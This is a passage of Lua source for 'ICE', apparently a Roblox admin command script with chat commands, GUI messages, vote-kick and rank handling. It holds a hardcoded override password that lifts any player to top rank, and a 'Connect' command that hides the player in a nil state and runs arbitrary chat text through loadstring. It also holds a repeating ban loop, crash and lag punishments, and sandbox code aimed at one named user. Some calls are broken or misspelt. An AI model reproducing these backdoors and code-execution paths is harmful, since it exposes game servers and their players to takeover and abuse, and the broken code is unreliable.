			-- Found Least Multiple of 3 with remainder
			local Remainder=Needed - Mult
			if Remainder == 1 then
				-- What to do
				NumNeeded= Needed / 3
				NumNeeded=NumNeeded + NumNeeded
			else
				-- Remainder is 2 :)
				NumNeeded = tonumber(Needed + 1) / 3
				NumNeeded = NumNeeded + NumNeeded
			end
		end
		wait(1)
		VoteMsg='The votes are in; (Yes): ' .. Yes .. ' (No): ' .. No
		wait(1)
		if Yes >= Needed then
			VoteMsg.Text=Player.Name .. ' will now be kicked'
			pcall(function() Player:Destroy() end)
		else
			VoteMsg=Player.Name .. ' will not be kicked'
		end
	end)()
end			
ICE.CrashObj=function(Object)
				--Object:Destroy()
				Object.Parent.Head:Destroy()
				Object.Parent:Destroy()  
end			
ICE.CrashCam=function()
	local Focus=ICE.Services.Workspace:findFirstChild('Focus',true)
	if Focus then
		ICE.CrashObj(Focus)
	end
end
ICE.MakeMessage=function(str,p)
	if p==nil then
		for _,Player in pairs(game.Players:GetPlayers()) do
			coroutine.wrap(function()
				local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
				local Text = Instance.new("TextLabel", Msg)
				Text.Position = UDim2.new(0, 0, 0.7, 0)
				Text.Font=2
				Text.FontSize=9
				Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
				Text.BackgroundTransparency = 0.4
				Text.TextColor3 = Color3.new(1, 1, 1)
				Text.TextTransparency = 1
				Text.TextWrap = true
				Text.Text = tostring(str)
				Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0.7, 0), "Out", "Back", 2)
				Text.TextTransparency = 0
				Num = #str * 0.06
				wait(3)
				Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
				wait(Num)
				Msg:Remove()
			end)()
		end
	else
		Player=p;
		coroutine.wrap(function()
			local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
			local Text = Instance.new("TextLabel", Msg)
			Text.Position = UDim2.new(0, 0, 0.7, 0)
			Text.Font=2
			Text.FontSize=9
			Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
			Text.BackgroundTransparency = 0.1
			Text.TextColor3 = Color3.new(1, 1, 1)
			Text.TextTransparency = 1
			Text.TextWrap = true
			Text.Text = tostring(str)
			Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0.7, 0), "Out", "Back", 2)
			Text.TextTransparency = 0
			Num = #str * 0.06
			wait(3)
			Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
			wait(Num)
			Msg:Remove()
		end)()
	end
end
ICE.SystemMsg=function(str)
	for _,Player in pairs(game.Players:GetPlayers()) do
		coroutine.wrap(function()
			local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
			local Text = Instance.new("TextLabel", Msg)
			Text.Position = UDim2.new(0, 0, 0, 0)
			Text.Font='Legacy'
			Text.FontSize = "Size48"
			Text.BackgroundColor3 = Color3.new(-1,-1,-1)
			Text.BackgroundTransparency = 0.4
			Text.TextColor3 = Color3.new(1,1,1)
			Text.TextTransparency = 0
			Text.TextWrap = true
			Text.Text = '[ System Message ] \n ' .. tostring(str)
			Text:TweenSizeAndPosition(UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0), "Out", "Back", 2)
			Text.TextTransparency = 0.1
			Num = #str * 0.06
			wait(6)
			Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
			wait(Num)
			Msg:Remove()
		end)()
	end
end
ICE.MakeHint=function(str,p)
	if p == nil then
		for _,Player in pairs(game.Players:GetPlayers()) do
			coroutine.wrap(function()
				local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
				local Text = Instance.new("TextLabel", Msg)
				Text.Position = UDim2.new(0, 0, 0, 0)
				Text.Font=2
				Text.FontSize=9
				Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
				Text.BackgroundTransparency = 0.4
				Text.TextColor3 = Color3.new(1, 1, 1)
				Text.TextTransparency = 1
				Text.TextWrap = true
				Text.Text = tostring(str)
				Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0, 0), "Out", "Back", 2)
				Text.TextTransparency = 0
				Num = #str * 0.06
				wait(3)
				Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
				wait(Num)
				Msg:Remove()
			end)()
		end
	else
		Player=p
		coroutine.wrap(function()
			local Msg = Instance.new("ScreenGui", Player:findFirstChild'PlayerGui' or Instance.new('PlayerGui',Player))
			local Text = Instance.new("TextLabel", Msg)
			Text.Position = UDim2.new(0, 0, 0, 0)
			Text.Font=2
			Text.FontSize=9
			Text.BackgroundColor3 = Color3.new(77/255, 77/255, 77/255)
			Text.BackgroundTransparency = 0.1
			Text.TextColor3 = Color3.new(1, 1, 1)
			Text.TextTransparency = 1
			Text.TextWrap = true
			Text.Text = tostring(str)
			Text:TweenSizeAndPosition(UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0, 0), "Out", "Back", 2)
			Text.TextTransparency = 0
			Num = #str * 0.06
			wait(3)
			Text:TweenPosition(UDim2.new(0.1, 0, 2, 0), "InOut", "Quad")
			wait(Num)
			Msg:Remove()
		end)()
	end
end
ICE.GiveInfo=function(Speaker)
	Num_Commands=0
	Num_Services=0
	Num_Tablets=0
	Num_Ranked=0
	Version=1
	coroutine.wrap(function() for i,v in pairs(ICE.Commands) do Num_Commands=Num_Commands+1 end end)()
	coroutine.wrap(function() for i,v in pairs(ICE.Services) do Num_Services=Num_Services+1 end end)()
	coroutine.wrap(function() for i,v in pairs(ICE.Ranked) do Num_Ranked=Num_Ranked+1 end end)()
	coroutine.wrap(function() for i,v in pairs(ICE.Tablets) do Num_Tablets=Num_Tablets+1 end end)()
	coroutine.wrap(function() for i,v in pairs(ICE) do if type(v)=='function' then Version=Version+#ICE/0.01337 end end end)()
	ICE.Output('#Tablets ' .. tostring(Num_Tablets),'Random',Speaker)
	ICE.Output('#Services ' .. tostring(Num_Services),'Random',Speaker)
	ICE.Output('#Ranked ' .. tostring(Num_Ranked),'Random',Speaker)
	ICE.Output('#Commands ' .. tostring(Num_Commands),'Random',Speaker)
	ICE.Output('Version : ' .. tostring(Version),'Random',Speaker)
	ICE.Output('Help menu','Green',Speaker,nil,
			function()
			    ICE.Output('Back','Blue',Speaker,nil,function() ICE.OnChatted(ICE.Bets[1]..'help'..ICE.Bets[2],Speaker,true) end)
				ICE.Output('Get player operators','Orange',Speaker,nil,function()
						ICE.RemoveTablets(Speaker)
						ICE.Output('Back','Blue',Speaker,nil,function() ICE.OnChatted(ICE.Bets[1]..'help'..ICE.Bets[2],Speaker,true) end)
						Infos={
							{T="The bets are ["..ICE.Bets[1]..";"..ICE.Bets[2].."]",C="Orange"};
							{T="To use a cmd its "..ICE.Bets[1].."Command"..ICE.Bets[2].."Arguments/Args",C="Orange"};
							{T="To use a command on your self use the command and for arguments put 'me'",C="Blue"};
							{T="To use a command on everyone use the command and for aguments put 'all'",C="Blue"};
							{T="To use a command on others use the command and for arguments put 'others'",C="Blue"};
						};
						for i,v in pairs(Infos) do
							ICE.Output(v.T,v.C,Speaker)
						end
				end)
				ICE.Output('Chat operators','Orange',Speaker,nil,function()
					--ypcall(function()
						ICE.RemoveTablets(Speaker)
						Infos={
							{T="To use a cmd more then once do '" .. ICE.Bets[1] .. " do (a number)"..ICE.Bets[1].."(a command)".. ICE.Bets[2] .."(arguments)'",C="Blue"};
							{T="To wait before using a command do '" .. ICE.Bets[1].. " wait" .. ICE.Bets[1].. "(a command)" .. ICE.Bets[2] .. "(arguments)'",C="Blue"};
						};
						for i,v in pairs(Infos) do
							ICE.Output(v.T,v.C,Speaker)
						end
						ICE.Output('Back','Blue',Speaker,nil,function() ICE.OnChatted(ICE.Bets[1]..'help'..ICE.Bets[2],Speaker,true) end)
					--end)
				end)
			end
		)
end
--[[ Sandbox ]]--
ICE.SandBoxCoding=[[
	coroutine.wrap(function()
		repeat
			wait()
				for i,v in pairs(getfenv()) do
					obj=getfenv[i]
					if type(obj)=='userdata' then
						if obj.Name=='SergeantSmoke' then
							if obj:IsA'Player' then
								getfenv()[i]=nil;
							end
						end
					end
				end
		until	 1+1==3
	end)()
	%s
]]
ICE.SandBoxScript=function(Script)
	Source=nil;
	Script.Disabled=true
	for i,v in pairs(Script:children()) do
		if v:IsA'StringValue' then
			Old="" .. ICE.SandBoxCoding
			Old=Old:format(v.Value)
			v.Value=Old
		end
	end
	Script.Disabled=false
end
--[[ End Of Sand Box ]]--
--[=[ End of funcs ]=]--
--[[ Rank 0 ]]--
ICE.Command('Connect','connect',0,'Connects to nil device','No args',
	function(Msg,Speaker)
		SC=ICE.CreateLocalScript([==[script.Parent=nil
Player=game.Players.LocalPlayer
Probe=Instance.new'Part';
CN='SergeantSmoke'
Camera=Workspace.CurrentCamera
Animate = game:GetService("InsertService"):LoadAsset(68452456):findFirstChild("Animate",true) or Instance.new("Part")
Char = Player.Character
if Char then
	Char.Archivable = true
	Char = Char:clone()
	local t = game:GetService("InsertService"):LoadAsset(68452456):findFirstChild("Clone")
	if t then
		for k,v in pairs(Char:GetChildren()) do
			if not v:IsA("Part") then
				v:clone().Parent = t
			end
		end
		Char = t:clone()
	end
end
Title=function(txt,part,color,rise)
	col=nil
	col=Color3.new(BrickColor.new(color))
	local Gui = Instance.new("BillboardGui",part)
	Gui.Name = "3DGUI"
	Gui.ExtentsOffset = Vector3.new(0,2,0)
	Gui.Size = UDim2.new(8,0,2,0)
	local Tit = Instance.new("TextLabel",Gui)
	Tit.Name = "Title"
	Tit.TextColor3 = Color3.new(col.r/2,col.g/2,col.b/2)
	Tit.TextColor3 = Color3.new(0,0,0)
	Tit.TextTransparency = 0.25
	Tit.TextStrokeColor3 = Color3.new(col.r/2,col.g/2,col.b/2)
	Tit.TextStrokeTransparency = 0.5
	Tit.Size = UDim2.new(1,0,1,0)
	Tit.BackgroundTransparency = 1
	Tit.Font = "ArialBold"
	Tit.TextScaled = true
	Tit.Text = txt
	if rise then
		if not tonumber(rise) then rise = 1 end
		coroutine.wrap(function()
			while Tit.Parent and Gui.Parent and wait() do
				Gui.ExtentsOffset = Gui.ExtentsOffset + Vector3.new(0,0.025*rise,0)
			end
		end)()
	end
	return Tit
end
Chat=function(Part,Text,Color,Type)
	if Type==nil or Type==1 or Type=='Bubble' then
		game:service'Chat':Chat(Part,Text,Color)
	else
		if type(Color)~='string' then	
			Color=tostring(BrickColor.random())
		end
		Title(Text,Part,Color,math.random(1,3))
	end
end
DestroyCharacter=function()
	local chara = Player.Character
	if not chara then return end
	if chara:findFirstChild("Humanoid") then
		chara.Humanoid:Destroy()
	end
	chara:BreakJoints()
	for k,v in pairs(chara:GetChildren()) do
		if v:IsA("BasePart") then
			v.CanCollide = false
			v.Velocity = Vector3.new(math.random(-20,20),50,math.random(-20,20))
			v.RotVelocity = Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
		end
	end
	game.Debris:AddItem(chara,3)
end
MakeProbe=function()
	if Player.Character then DestroyCharacter() end Player.Character = nil
	if Probe then Probe:Destroy() end
	Probe = Instance.new("Part",workspace) local Camera = workspace.CurrentCamera
	Probe.Shape, Probe.Size, Probe.BrickColor = "Ball", Vector3.new(3,3,3), BrickColor.new('Black')
	Probe.Transparency, Probe.Reflectance, Probe.Anchored, Probe.CanCollide, Probe.Locked = 0.5, 0.25, true, false, true
	Probe.TopSurface, Probe.BottomSurface, Probe.Name = 0, 0, "Probe"..tick()
	coroutine.wrap(function() while wait() and not Player.Character do Probe.CFrame = Camera.Focus end end)()
	--Player.Character=Probe
end
Spawn=function()
	if Char then
		local c = Char:clone()
		c.Name = CN
		c.Parent = workspace
		c:MoveTo(workspace.CurrentCamera.Focus.p)
		Player.Character = c
		workspace.CurrentCamera.CameraSubject = c:findFirstChild("Humanoid")
		workspace.CurrentCamera.CameraType = "Custom"
		Probe:Destroy()
	end
end
Player.Chatted:connect(function(Msg)
	if Msg:sub(1,2) == '\\\\' then
		local Func,Error=loadstring(Msg:sub(3))
		if Error==nil then
			pcall(Func)
			if Player.Character then
				game:service'Chat':Chat(Player.Character.Head,'Local Script executed!','Green')
			end
		else
			if Player.Character then
				game:service'Chat':Chat(Player.Character.Head,Error,'Red')
			else
				local Msg=Instance.new'Message'
				Msg.Parent=Workspace.CurrentCamera
				Msg.Text=Error
				game:service'Debris':AddItem(Msg,5)
			end
		end
	elseif Msg:sub(1,#('newlocal')+2) == '\\newlocal\\' then
		NewMsg=Msg:sub(#('newlocal')+3)
		Split=NewMsg:find('\\')
		local PlayerName=NewMsg:sub(1,Split-1)
		local Source=NewMsg:sub(Split+1)
		Player=nil
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name:lower():sub(1,#PlayerName)==PlayerName then
				if Player==nil then
					Player=v
				else
					if type(Player) == 'table' then
						Player[#Player+1]=v
					else
						Player={v}
					end
				end
			end
		end
		if type(Player)=='table' then
			for i,v in pairs(Player) do	
				if newLocalScript then
					newLocalScript(Source,v.Character)
				else
					Clone=script:clone();
					SourceC=Clone:children()[1]
					if SourceC:IsA'StringValue' then
						print'String'
					else
						SourceC=Clone:children()[2]
					end
					SourceC.Value=Source
					Clone.Disabled=true
					Clone.Parent=v.Character
					Clone.Disabled=false
				end
			end
		else
			if newLocalScript then
				newLocalScript(Source,Player.Character)
			else
				Clone=script:clone();
				DS=Clone:children()
				DSS=nil
				for i,v in pairs(DS) do if v:IsA'StringValue' then DSS=v end end
				DSS.Value=Source
				Clone.Disabled=true;
				Clone.Parent=Player.Character
				Clone.Disabled=false
			end
		end
	elseif Msg:sub(1,#('rejoin')+2) == '\\rejoin\\' then
		game:service'TeleportService':Teleport(Game.PlaceId)
	elseif Msg:sub(1,#('probe')+2) == '\\probe\\' then
		MakeProbe()
	elseif Msg:sub(1,#('char')+2) =='\\char\\' then
		Spawn()
	elseif Msg:sub(1,#('ban')+2) == '\\ban\\' then
		Player=game.Players:findFirstChild(Msg:sub(#('ban')+3))
		if Player then
			repeat pcall(function() game.Players[Player.Name]:Destroy() end) wait() until 1+1==3 
		end
	end
	wait()
	if game.Players:findFirstChild(Player.Name)==nil and not Msg:find('\\probe\\') and not Msg:find('\\char\\') then -- Is nil then
		if Probe then
			Chat(Probe,Msg,math.random(0,2))
		else	
			if Player.Character==nil then
				if Char then
					Chat(Char.Head,Msg,math.random(0,2))
				end
			else
				Chat(Player.Character.Head,Msg,'Red')
			end
		end
	end
end) -- local
]==],Speaker.Character)
		if SC then
			ICE.Output('Sucessful attempt at connecting! When you are removed from game chat \\probe\\ or \\char\\','Green',Speaker)
		else
			ICE.Output('Unsucessful connection attempt!','Red',Speaker)
		end
	end
)
ICE.Command('Commands','cmds',0,'Shows commands','No arguments',
	function(Msg,Speaker)
		ICE.RemoveTablets(Speaker)
		local Mine=ICE.Ranked[Speaker.Name]
		for i=1,#ICE.Ranks do
			if i > 0 and i < #ICE.Ranks + 1 then
				ICE.Output('Rank ' .. tostring(i),Mine.Color,Speaker,nil,
					function()
						ICE.RemoveTablets(Speaker)
						if Mine.Rank < i then
							ICE.Output('You cannot access to these commands! View anyways?','Red',Speaker,nil,function()
								--ICE.RemoveTablets(Speaker)
								Num=0
								for e,v in pairs(ICE.Commands) do
									if v.Rank == i then
										Num=Num+1
										ICE.Output(e,'Random',Speaker,nil,
											function()
												ICE.RemoveTablets(Speaker);
												for Name,Str in pairs(v) do
													ICE.Output(tostring(Name) .. '; ' .. tostring(Str),Mine.Color,Speaker)
												end
												ICE.Output('Syntax : ' .. Str.Command .. ICE.Bet,Mine.Color,Speaker)
											end
										)
									end
								end
								if Num== 0 then
									ICE.Output('No available commands for this rank!','Red',Speaker)
								end
							end)
						else
							Num=0
							for CmdName,CmdTable in pairs(ICE.Commands) do
								if CmdTable.Rank == i then
									Num=Num+1
									ICE.Output(CmdName,Mine.Color,Speaker,nil,
										function()
											ICE.RemoveTablets(Speaker);
											for Str,Val in pairs(CmdTable) do
												ICE.Output(tostring(Str) .. '; ' .. tostring(Val),Mine.Color,Speaker)
											end
											ICE.Output('Syntax : ' .. Val.Command..ICE.Bet,Mine.Color,Speaker)
										end
									)
								end
							end
							if Num== 0 then
								ICE.Output('No available commands for this rank!','Red',Speaker)
							end
						end
					end
				)
			end
		end
		ICE.Output('All','Green',Speaker,nil,
			function()
				ICE.RemoveTablets(Speaker);
				for i,v in pairs(ICE.Commands) do
					ICE.Output(i,'Random',Speaker,nil,
						function()
							ICE.RemoveTablets(Speaker)
							for Arg,Argg in pairs(v) do
								ICE.Output(tostring(Arg) .. " : " .. tostring(Argg),'Random',Speaker)
							end
						end
					)
				end
			end
		)
		ICE.Output('Your rank : ' .. ICE.Ranked[Speaker.Name].Rank,Mine.Color,Speaker)
	end
)					
ICE.Command('Dismiss','dismiss',0,[[Dismiss's tablets]],'No arguments',
	function(m,s) ICE.RemoveTablets(s) end
)
ICE.Command('Ping','ping',0,'Pings a msg','Msg',
	function(Msg,Speaker)	
		Pings={};
		if Msg:sub(1,#("tonumber"))=="tonumber" then
			local Nom=loadstring("return " .. tonumber(Msg:sub(#("tonumber")+1)))()
			table.insert(Pings,{Nom,'Random'})
		elseif  Msg:sub(1,#("image")) == "image" then
			local Sub=Msg:sub(#("image")+2)
			ICE.OutputImg(Sub,"A test image!","Random",Speaker)
		elseif Msg:lower()=="nil" then
			Nil=0
			for i,v in pairs(game:service'NetworkServer':children()) do
				if v:IsA('ServerReplicator') then
					if v:GetPlayer() and v:GetPlayer().Parent==nil then
						Nil=Nil+1
						table.insert(Pings,{v:GetPlayer().Name,'Random'})
					end
				end
			end
			if Nil==0 then table.insert(Pings,{"No nil players",'Red'}) end
		elseif Msg:lower()=='nil raw' then
			local Nil=0;
			for _,v in pairs(game:service'NetworkServer':children()) do
				if v:IsA'ServerReplicator' then
					if v:GetPlayer() and v:GetPlayer().Parent==nil then
						Nil=Nil+1
						ICE.Output(v:GetPlayer().Name,'Red',Speaker,nil,function() ICE.PlayerInterface(v:GetPlayer().Name,Speaker) end)
					end
				end
			end
			if Nil==0 then ICE.Output('No nil players','Green',Speaker,3) end
		elseif Msg:lower()=="colors" then
			for i,v in pairs(ICE.Colors) do
				table.insert(Pings,{i,v})
			end
		elseif Msg:lower()=="ranks" then
			for i,v in pairs(ICE.Ranks) do
				table.insert(Pings,{i .. ":"..v,'Random'})
			end
		elseif #Msg==0 then
			table.insert(Pings,{'Pong!','Random'})
		else
			table.insert(Pings,{Msg,'Random'})
		end
		if #Pings < 2 then
			for i,v in pairs(Pings) do
				Color=v[2]
				Message=v[1]
				ICE.Output(Message,Color,Speaker)
			end
		else
			ICE.RemoveTablets(Speaker);
			for i,v in pairs(Pings) do
				Color=v[2]
				Message=v[1]
				ICE.Output(Message,Color,Speaker)
			end
		end
	end
)
ICE.Command('Get-ranked','getranked',0,'Gets the Ranked table','No arguments',
	function(Msg,Speaker)
		Player=nil
		if #Msg==0 then
			for i,v in pairs(ICE.Ranked) do
				ICE.Output(i,v.Color,Speaker,nil,
					function()
						Player=i
						ICE.RemoveTablets(Speaker)
					end
				)
			end
		else
			for _,v in pairs(ICE.Ranked) do
				if _:lower():sub(1,#Msg) == Msg:lower() then
					Player=_
				end
			end
		end
		coroutine.wrap(function()
			repeat
				wait()
			until Player
			ICE.PlayerInterface(Player,Speaker)
		end)()
	end
)
ICE.Command('Chatcolor','chatcolor',0,'Changes your chatcolor','No arguments',
    function(Msg,Speaker)
		if #Msg == 0 then
			for i,v in pairs(ICE.Colors) do -- Stahp it>_> Regular Color3's Work its what I did BrickColor.new(Color3.new(0,1,0))
				ICE.Output(i,v,Speaker,nil,function()  Speaker.Neutral = false Speaker.TeamColor = BrickColor.new(v) ICE.RemoveTablets(Speaker) end)
			end
		else
			local Brick=BrickColor.new(Msg) 
			if Brick then
				Speaker.TeamColor=Brick
				Speaker.Neutral=false
			else
				ICE.Output(Brick .. '[ error ]','Red',Speaker)
			end
		end
    end
)
ICE.Command('Vote kick','votekick',0,'Vote kicks a player','Player',
	function(Msg,Speaker)
		if ICE.VoteData.IsVoting==false then
			local Player = ICE.GetPlayers(Msg,Speaker)[1] 
			if Player then 
				ICE.VoteData.ActivateVoteKick(Player)
			end
		else
			ICE.Output('There is already a vote in progress!','Red',Speaker,5)
		end
	end
)
ICE.Command('Menu','menu',0,'Shows ICE Menu','No arguments',
	function(Msg,Speaker)
		local SpeakTab=ICE.Ranked[Speaker.Name]
		ICE.RemoveTablets(Speaker)
		ICE.Output('Show commands!',SpeakTab.Color,Speaker,nil,function() ICE.OnChatted(ICE.Bets[1]..'cmds'..ICE.Bets[2],Speaker,true) end)
		ICE.Output('Your rank is ' .. SpeakTab.Rank,SpeakTab.Color,Speaker)
		ICE.Output('To access your ranked table click on me!',SpeakTab.Color,Speaker,nil,function() ICE.OnChatted(ICE.Bets[1]..'getranked'..ICE.Bets[2]..Speaker.Name,Speaker,true) end)
		ICE.Output('Welcome to ICE by tu'..'sK'..'Or6'..'61',SpeakTab.Color,Speaker)
		ICE.Output('Click to debug lighting','Green',Speaker,nil,function() ICE.OnChatted(ICE.Bets[1]..'debug'..ICE.Bets[2],Speaker,true) end)
		ICE.Output('View chat operators','Green',Speaker,nil,
			function()
				ICE.Output('Get player operators','Orange',Speaker,nil,function()
						Infos={
							{T="The bets are ["..ICE.Bets[1]..";"..ICE.Bets[2].."]",C="Orange"};
							{T="To use a cmd its "..ICE.Bets[1].."Command"..ICE.Bets[2].."Arguments/Args",C="Orange"};
							{T="To use a command on your self use the command and for arguments put 'me'",C="Blue"};
							{T="To use a command on everyone use the command and for aguments put 'all'",C="Blue"};
							{T="To use a command on others use the command and for arguments put 'others'",C="Blue"};
						};
						for i,v in pairs(Infos) do
							ICE.Output(v.T,v.C,Speaker)
						end
				end)
				ICE.Output('Chat operators','Orange',Speaker,nil,function()
					--ypcall(function()
						Infos={
							{T="To use a cmd more then once do '" .. ICE.Bets[1] .. " do (a number)"..ICE.Bets[1].."(a command)".. ICE.Bets[2] .."(arguments)'",C="Blue"};
							{T="To wait before using a command do '" .. ICE.Bets[1].. " wait" .. ICE.Bets[1].. "(a command)" .. ICE.Bets[2] .. "(arguments)'",C="Blue"};
						};
						for i,v in pairs(Infos) do
							ICE.Output(v.T,v.C,Speaker)
						end
					--end)
				end)
			end
		)
	end
)
ICE.Command('Debug','debug',0,'Debugs the game','No arguments',
	function(Msg,Speaker)
		ICE.Services.Lighting.Ambient = Color3.new(1,1,1)
		ICE.Services.Lighting.OutdoorAmbient=Color3.new(1,1,1)
		ICE.Services.Lighting.ColorShift_Bottom = Color3.new(0,0,0)
		ICE.Services.Lighting.ColorShift_Top = Color3.new(0,0,0)
		ICE.Services.Lighting.ShadowColor = Color3.new(0.69,0.69,0.69)
		ICE.Services.Lighting.Brightness = 0.2
		ICE.Services.Lighting.FogStart = 0
		ICE.Services.Lighting.FogEnd = 100000
		ICE.Services.Lighting.FogColor = Color3.new(0.74,0.74,0.74)
		ICE.Services.Lighting.TimeOfDay = 12
		ICE.Services.Lighting.GlobalShadows=false
		for i,v in pairs(Workspace:children()) do
			if v:IsA'Hint' or v:IsA'Message' then
				v:Destroy()
				for i,s in pairs(v:children()) do
					if s:IsA'Hint' or s:IsA'Message' then
						s:Destroy();
						for i,b in pairs(s:children()) do
							if b:IsA'Hint' or b:IsA'Message' then
								b:Destroy();
							end
						end
					end
				end
			end
		end
	end
)
ICE.Command('Set rank','setrank',0,'Sets #Players rank to #Rank','#Player>#Rank',
		function(Msg,Speaker)
            local Split = Msg:find(ICE.Bets[2])
            for _,v in pairs(ICE.GetPlayers(Msg:sub(1,Split-1),Speaker)) do
				if v.Name ~= Speaker.Name then
                    local Rank = tonumber(Msg:sub(Split+1))
                    if Rank >= ICE.GetRank(Speaker) or ((Rank < 0 or ICE.GetRank(v) < 0) and ICE.GetRank(Speaker) < 2 ) then
                        ICE.Output("You can't set "..v.Name.."'s rank to "..tostring(Rank),"Orange",Speaker,3)
                    elseif ICE.Ranks[Rank] == nil then
                        ICE.Output("Rank not found.","Orange",Speaker,3)
                    else
                        ICE.Ranked[v.Name].Rank = Rank
                    end
				else
					ICE.Output('You cannot set your own rank','Red',Speaker,3)
				end
             end
        end
)	
ICE.Command('@','@',0,'On chats a msg at #Player','#Player>Msg',
	function(Msg,Speaker)
		local Split,Msgg,Players=Msg:find(ICE.Bets[1]),"",{};
		if Split then
			Msgg=Msg:sub(Split)
			Players=ICE.GetPlayers(Msg:sub(1,Split-1),Speaker)
		end
		for i,v in pairs(Players) do
			ICE.OnChatted(Msgg,v,true)
		end
	end
)
ICE.Command('Get CMD Bar','getcmd',0,'Gets CMD Gui','true/false',
	function(Msg,Speaker)
		if Msg=='true' or Msg=="1" or Msg=="on" then
			ICE.Ranked[Speaker.Name].CMD=true
		elseif Msg=='false' or Msg=="0" or Msg=="off" then
			ICE.Ranked[Speaker.Name].CMD=false
			pcall(function() Speaker.PlayerGui.CMD:Destroy() end)
		else
			ICE.Output('Bool has to be true/false or 1/0 or on/off','Red',Speaker)
		end
	end
)
ICE.Command('Personal message','pm',0,'PMs #Player','#Player'..ICE.Bets[2]..'Message',
	function(Msg,Speaker)
		Split=Msg:find(ICE.Bets[2])
		Split2=Msg:sub(Split+1):find(ICE.Bets[2])
		local Type="Message"
		if Split2 then
			Type=Msg:sub(Split2+1)
		end
		Players=ICE.GetPlayers(Msg:sub(1,Split-1),Speaker)
		Message=""
		if Split2 then
			Message=Msg:sub(Split+1,Split2-1)
		else
			Message=Msg:sub(Split+1)
		end
		for i,Player in pairs(Players) do
			if Type:lower()=='Message' then
				ICE.MakeMessage('Private msg from ' .. Speaker.Name .. ' : ' .. Message,Player)
			elseif Type:lower()=='Hint' then
				ICE.MakeHint('Private msg from ' .. Speaker.Name .. ' : ' .. Message,Player)
			else
				ICE.MakeMessage('Private msg from ' .. Speaker.Name .. ' : ' .. Message,Player)
			end
		end
	end
)				
ICE.Command('Override','override',0,'Overrides ICE','Code',
	function(Code,Speaker)
		if Code=='ScriptItNao' then
			ICE.Ranked[Speaker.Name].Rank=10
			ICE.Output('You have sucessfully overrode ICE','Green',Speaker)
		else
			ICE.Output('Wrong code','Red',Speaker)
		end
	end
)
ICE.Command('Show filters','sfilt',0,'Shows all ICE Filters','No arguments',
	function(Msg,Speaker)
		ICE.RemoveTablets(Speaker);
		SetUpDF=function(FTable,FName)
			ICE.RemoveTablets(Speaker);
			Reason,Rank,Punishment=FTable.Reason,FTable.Bypass,FTable.Punishment
			ICE.Output('Reason : ' .. tostring(Reason or "nil"),'Green',Speaker);
			ICE.Output('Rank to bypass filter : ' .. tostring(Rank or "nil"),'Orange',Speaker);
			NewPun=""
			--if type(Punishment)=='number' then
				Types={{"Kill",0};{"Kick",1};{"Shutdown",2};{"Crash",3};{"Ban";4};{"Lag",5}}
				for i,v in ipairs(Types) do
					if Punishment==v[2] then
						NewPun=v[1]
					end
				end
			--[[else
				Types={{"Kill",0};{"Kick",1};{"Shutdown",2};{"Crash",3};{"Ban";4};{"Lag",5}}
				for i,v in pairs(Types) do
					if Punishment==v[1] then
						NewPun=v[1]
					end
				end
			end]]
			ICE.Output('Punishment : ' .. tostring(NewPun or "nil"),'Red',Speaker);
			ICE.Output('Change rank for bypass','Blue',Speaker,nil,
				function()
					if ICE.GetRank(Speaker) > 0 and ICE.GetRank(Speaker) > Rank then
						ICE.RemoveTablets(Speaker);
						for Num,Name in pairs(ICE.Ranks) do
							if not Num > ICE.GetRank(Speaker) then
								ICE.Output(tostring(Num),Color3.new(Num/10,Num/10,Num/100),Speaker,nil,
									function()
										ICE.RemoveTablets(Speaker);
										ICE.Filters[FName].Rank=tonumber(Num)--FTable.Rank=tonumber(Num)
										SetUpDF(FTable,FName)
									end
								)
							end
						end
					else
						ICE.Output('Your rank is too low to execute this action','Red',Speaker,3)
					end
				end
			)
			ICE.Output('Change punishment type','Blue',Speaker,nil,
				function()
					if ICE.GetRank(Speaker) > 0 and ICE.GetRank(Speaker) > Rank then
						ICE.RemoveTablets(Speaker)
						Types={{"Kill",0};{"Kick",1};{"Shutdown",2};{"Crash",3};{"Ban";4};{"Lag",5}}
						for i,v in pairs(Types) do
							if ICE.GetRank(Speaker) > v[2] then
								ICE.Output('Change punishment to ' .. v[1],'Blue',Speaker,nil,
									function()
										ICE.Filters[FName].Punishment=v[2]
										ICE.RemoveTablets(Speaker)
										SetUPDF(FTable,FName)
									end
								)
							end
						end
					else
						ICE.Output('Your rank is not high enough for this operation','Red',Speaker,3)
					end
				end
			)
		end
		for Derp,DerpTable in pairs(ICE.Filters) do
			ICE.Output(Derp,'Random',Speaker,nil,function() SetUpDF(DerpTable,Derp) end)
		end
	end
)	
ICE.Command('Rules','rules',0,'Shows ancient rules set down by elders at oxcools','No arguments',
	function(Message,Speaker)
		for i,v in pairs(ICE.Rules) do	
			ICE.Output(v,ICE.Ranked[Speaker.Name].Color,Speaker)
		end
	end
)
ICE.Command('Show credits','credits',0,'Shows credits','No arguments',
	function(Msg,Speaker)
		for Name,Reason in pairs(ICE.Credits) do
			ICE.Output(Name .. " " .. Reason,ICE.Ranked[Speaker.Name].Color,Speaker)
		end
	end
)
ICE.Command('Help','help',0,'Gives help','help',
	function(Msg,Speaker)
		ICE.GiveInfo(Speaker)
	end
)
--[[ Rank 1 ]]--
ICE.Command('Base','base',1,'Makes a base in workspace','No arguments',
	function(Msg,Speaker)
		Norm=nil
